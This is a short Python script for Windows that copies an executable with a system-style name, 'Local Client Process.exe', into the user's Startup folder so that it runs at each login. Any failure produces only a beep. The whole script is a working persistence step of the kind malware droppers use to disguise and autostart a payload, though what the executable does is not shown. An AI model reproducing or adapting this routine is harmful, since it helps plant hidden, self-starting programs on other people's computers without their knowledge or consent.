import os
import subprocess
import shutil
import winsound
targetfile = "Local Client Process.exe"
targetpath = fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

def main():
    try:
        shutil.copy2(targetfile,targetpath)
    except: winsound.Beep(1000,1000)

if __name__ == "__main__":
    main()
